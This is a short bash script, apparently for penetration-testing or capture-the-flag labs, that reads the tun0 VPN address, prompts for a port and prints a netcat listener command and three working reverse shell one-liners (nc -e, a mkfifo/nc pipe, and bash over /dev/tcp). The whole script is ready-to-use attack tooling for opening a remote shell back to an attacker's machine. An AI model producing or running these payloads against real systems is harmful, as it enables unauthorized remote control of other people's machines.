#!/bin/bash
CYAN='\033[0;36m'
NOCOLOR='\033[0m'


# Find the IP of the tun0 interface, change tun0 to something else if desired
tun0="$(ip addr show | grep tun0 |grep -o 'inet [0-9]*\.[0-9]*\.[0-9]*\.[0-9]*' | grep -o '[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*')"

# Take user input to set the listening port
read -p "Enter the port you will listen on: " port

# List generated stuff
echo "-----------------------------------------------"
echo "|||||||| Easy Reverse Shell Generator |||||||||"
echo "-----------------------------------------------"
echo ""
echo "Your tun0 IP:   $tun0"
echo ""
echo "Listen with:  nc -lvp $port"
echo ""
echo "Reverse Shell Scripts"
echo "-----------------------------------------------"
echo "netcat with -e option:"
echo -e "${CYAN}nc -e /bin/bash $tun0 $port${NOCOLOR}"
echo ""
echo "netcat without -e option:"
echo -e "${CYAN}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $tun0 $port >/tmp/f${NOCOLOR}"
echo ""
echo "Standard reverse TCP:"
echo -e "${CYAN}bash -i >& /dev/tcp/$tun0/$port 0>&1${NOCOLOR}"
echo ""
echo ""
